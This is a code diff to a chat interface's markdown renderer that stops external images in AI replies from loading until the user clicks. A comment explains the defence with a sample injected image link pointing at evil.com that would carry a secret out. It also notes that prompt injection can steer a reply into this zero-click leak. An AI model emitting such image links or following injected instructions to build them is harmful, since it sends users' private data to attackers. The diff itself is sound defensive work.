@@ -54,6 +54,34 @@ class MarkdownErrorBoundary extends Component<
   }
 }
 
+/**
+ * External (third-party) image in a reply — rendered only after an explicit
+ * click. See the img() renderer for why: auto-loading a remote image is a
+ * zero-click data exfiltration channel if a reply was influenced by a prompt
+ * injection. The host is shown up front so the user knows who they'd be
+ * contacting before they contact them.
+ */
+function ExternalImage({ src, alt }: { src: string; alt: string }) {
+  const [load, setLoad] = useState(false);
+  let host = 'an external site';
+  try { host = new URL(src).host; } catch { /* malformed — keep the generic label */ }
+
+  if (load) {
+    // eslint-disable-next-line @next/next/no-img-element -- unknown dimensions
+    return <img src={src} alt={alt} className="max-w-full rounded my-1" />;
+  }
+  return (
+    <button
+      type="button"
+      onClick={() => setLoad(true)}
+      title={src}
+      className="inline-flex items-center gap-1.5 px-2 py-1 my-0.5 rounded border border-dashed text-xs text-muted-foreground hover:bg-muted/50 transition-colors"
+    >
+      🖼️ <span>Load image from <span className="font-mono">{host}</span></span>
+    </button>
+  );
+}
+
 // Markdown content renderer using react-markdown
 function MarkdownContent({ content }: { content: string }) {
   // Strip raw tool call XML that local models sometimes emit as text
@@ -122,17 +150,31 @@ function MarkdownContent({ content }: { content: string }) {
           img({ src, alt }) {
             const cleanSrc = typeof src === 'string' ? src.trim() : '';
             if (!cleanSrc) return null;
-            const isFetchable = /^(https?:\/\/|data:|\/api\/)/i.test(cleanSrc);
-            if (!isFetchable) {
-              const filename = cleanSrc.split('/').pop() || cleanSrc;
-              return (
-                <span className="inline-flex items-center gap-1 px-2 py-0.5 my-0.5 rounded bg-muted text-xs font-mono text-muted-foreground">
-                  📎 {filename}
-                </span>
-              );
+            // C-48: an EXTERNAL image URL in a reply is a silent exfil
+            // channel — the browser GETs it the instant the bubble renders,
+            // so an injected ![](https://evil.com/leak?d=<secret>) ships data
+            // out with no click and nothing visible. Same-origin sources
+            // (/api/images, /api/workspace) and data: URLs make no
+            // third-party request and still auto-render, which covers every
+            // legitimate case: generated images go through /api/images.
+            // External images become click-to-load, showing the host first.
+            const isSameOrigin = /^\/api\//i.test(cleanSrc);
+            const isDataUri = /^data:image\//i.test(cleanSrc);
+            if (isSameOrigin || isDataUri) {
+              // eslint-disable-next-line @next/next/no-img-element -- markdown images have unknown dimensions and may be data: URLs
+              return <img src={cleanSrc} alt={alt || ''} className="max-w-full rounded my-1" />;
             }
-            // eslint-disable-next-line @next/next/no-img-element -- markdown images have unknown dimensions and may be data: URLs
-            return <img src={cleanSrc} alt={alt || ''} className="max-w-full rounded my-1" />;
+            if (/^https?:\/\//i.test(cleanSrc)) {
+              return <ExternalImage src={cleanSrc} alt={alt || ''} />;
+            }
+            // Workspace-relative paths like "selfies_eve/foo.png" can't be
+            // served by Next.js and would 404-flood on every re-render.
+            const filename = cleanSrc.split('/').pop() || cleanSrc;
+            return (
+              <span className="inline-flex items-center gap-1 px-2 py-0.5 my-0.5 rounded bg-muted text-xs font-mono text-muted-foreground">
+                📎 {filename}
+              </span>
+            );
           },
           p({ children }) {
             return <p className="mb-2 last:mb-0">{children}</p>;
